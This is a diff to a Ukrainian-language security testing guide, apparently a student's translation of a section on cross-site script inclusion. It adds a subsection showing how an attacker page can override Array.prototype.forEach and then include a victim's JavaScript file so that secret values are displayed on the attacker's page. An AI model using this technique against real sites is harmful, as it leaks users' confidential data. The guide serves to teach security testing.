@@ -151,3 +151,45 @@ Content-Length: 13
 <script src="http://victim.com/service/csvendpoint"></script>
 ```
 Коли веб-переглядач намагається відтворити вміст CSV як JavaScript, це не вдається та відбувається витік конфіденційних даних:
+![XSSI1](https://github.com/oleksandrblazhko/ai-191-buriak/assets/145441728/065c7f50-b479-4412-80c5-7f12e1da4d99)
+
+Рисунок 4.11.13-1: Повідомлення про помилку виконання JavaScript
+
+#### 5. Витік Конфіденційних Даних через З’єднання Прототипів 'це'
+У JavaScript `це` ключове слово яке має динамічну область видимості. Це означає, що якщо функція викликається до об’єкта, 'це' вона вказуватиме на цей об’єкт, навіть якщо викликана функція може не належати самому об’єкту. Така поведінка може бути використана для витоку даних. У наступному прикладі з [демонстраційної сторінки Себастьяна Лейке](http://sebastian-lekies.de/leak/) конфіденційні дані зберігаються в Масиві. Зловмисник може перевизначити `Array.prototype.forEach` за допомогою функції, керованої зловмисником. Якщо якийсь код викликає `forEach` функцію в екземплярі масиву, який містить конфіденційні значення, буде викликана функція, керована зловмисником, із `це` вказівкою на об’єкт, який містить конфіденційні дані.
+
+Ось уривок файлу JavaScript, який містить конфіденційні дані `javascript.js`:
+```
+...
+(function() {
+  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];
+
+  secret.forEach(function(element) {
+    // do something here
+  });  
+})();
+...
+```
+Конфіденційні дані можуть витікати за допомогою такого коду JavaScript:
+```
+...
+ <div id="result">
+
+    </div>
+    <script>
+      Array.prototype.forEach = function(callback) {
+        var resultString = "Your secret values are: <b>";
+        for (var i = 0, length = this.length; i < length; i++) {
+          if (i > 0) {
+            resultString += ", ";
+          }
+          resultString += this[i];
+        }
+        resultString += "</b>";
+        var div = document.getElementById("result");
+        div.innerHTML = resultString;
+      };
+    </script>
+    <script src="http://victim.com/..../javascript.js"></script>
+...
+```
